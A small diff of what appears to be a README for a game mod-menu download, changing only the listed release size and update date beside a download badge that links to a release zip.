@@ -13,7 +13,7 @@
 
 [![Download](https://img.shields.io/badge/Download-ModMenu-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/how-to-fish-bsproject-mod-menu/releases/download/Update2/Release.zip)
 
-**Current release:** `v0.7.5` · **Approx. size:** `103 MB` (Update 09-17)
+**Current release:** `v0.7.5` · **Approx. size:** `105 MB` (Update 09-18)
 
 </div>
 
